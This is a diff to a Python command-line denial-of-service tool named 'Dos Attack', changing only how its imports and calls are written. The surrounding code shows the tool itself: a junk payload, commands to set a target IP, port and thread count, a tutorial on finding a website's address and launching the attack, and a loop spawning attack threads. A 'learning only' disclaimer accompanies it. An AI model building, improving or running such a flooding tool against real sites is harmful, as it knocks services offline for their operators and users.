@@ -6,11 +6,10 @@ Project Name: Dos Attack ;
 Education: Fifth grade of primary school
 """
 import socket
-import threading
-import cmd
-import sys
-import random
-import time
+from threading import Thread
+from cmd import Cmd
+from sys import exit
+from time import sleep
 
 str_byte = "I'm attacking you" * 500
 randbyte = str_byte.encode()
@@ -19,7 +18,7 @@ count = 0
 threads = []
 
 
-class Main(cmd.Cmd):
+class Main(Cmd):
 	prompt = 'Dog_dos>'
 	intro = 'This tool is for learning only. Use it in accordance with local laws'
 	def do_tutorial(self,arg):
@@ -47,15 +46,15 @@ class Main(cmd.Cmd):
 		self.exit(arg)
 
 	def exit(self,arg):
-		sys.exit(0)
+		exit(0)
 
 	def tutorial(self,chose):
 		print('First, you must set the attack port with the "set_port" command.Generally for 80')
-		time.sleep(1)
+		sleep(1)
 		print('In addition, you must use the "set_ip" command to set the target IP address. You can obtain the IP address of the address by using the ping command + url in the Commond command line')
-		time.sleep(1)
+		sleep(1)
 		print('Then, you must use the "set_thread_num" command to set the number of attack threads. The more threads, the more efficient the attack is, and the more likely it is to succeed, but not the better.')
-		time.sleep(1)
+		sleep(1)
 		print('Finally, use the "attack" command, enter y, you can start the attack, will display the number of attacks, may be blocked by the website administrator, the consequences at your own risk')
 	def set_thread_num(self,num):
 		self.thread = int(num)
@@ -86,8 +85,8 @@ class Main(cmd.Cmd):
 
 	def true_to_attack_thread(self):
 		for i in range(1,self.thread+1):
-			time.sleep(0.1)
-			send = threading.Thread(target=self.true_to_attack_attack,args=())
+			sleep(0.1)
+			send = Thread(target=self.true_to_attack_attack,args=())
 			threads.append(send)
 			print(i," threads were generated successfully")
 		for j in threads:
